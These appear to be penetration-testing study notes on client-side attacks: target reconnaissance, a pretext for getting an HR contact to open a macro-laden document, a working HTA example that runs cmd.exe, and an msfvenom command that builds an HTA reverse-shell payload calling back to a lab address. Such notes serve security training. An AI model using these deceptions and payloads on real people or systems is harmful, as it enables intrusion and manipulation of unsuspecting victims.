NOTES
------------------

exploitation of client side software such as a browser or email client
typically involve some sort of deception to trick a user
do not typically require direct or routable access to the victim's machine

Know your target
	important to gain insight into the tech being used internally but as easy as WWW or FTP enum

	Passive Info Gathering
		googling various external corporate IP addresses
		social media sites revealing computer screens or job postings

	Active Client Information Gathering
		direct contact with a client
		targeted email or vishing

		Social Engineering and Client-Side Attacks
			sending malformed resume to a job posting
			HR responds saying they cant open the doc
			call back and ask what version of office they are using
			say some bs like the resume uses some advanced features like macros
			send an infected word doc

		Client Fingerprinting
			sudo wget https://github.com/Valve/fingerprintjs2/archive/master.zip

Leveraging HTML applications
	a file with the extension of .hta instead of .html is treated as an HTML application by Internet Explorer

	Exploring HTML Applications
		include HTML, BODY, and SCRIPT tags
		executed outside of the browser and therefore can use legacy and dangerous features that are blocked from within the browser

		-- Example --

		<html>
		<head>

		<script>

			var c= 'cmd.exe'
			new ActiveXObject('WScript.Shell').Run(c);

		</script>

		</head>
		<body>

		<script>

			self.close();

		</script>

		</body>
		</html>

		move the file into poc.hta and serve w apache
		client is presented with 2 popups but will run arbitrary code

	HTA Attack in Action
		use msfvenom to output an hta payload
			sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
			runs powershell with a couple flags
				-nop = do not load the user's default profile
				-w hidden = do not make a popup window
				-e = supply a base64 encoded payload
		need to make sure to serve with apache2 (not py simple server)

Exploiting Microsoft Office
	Macros and DDE
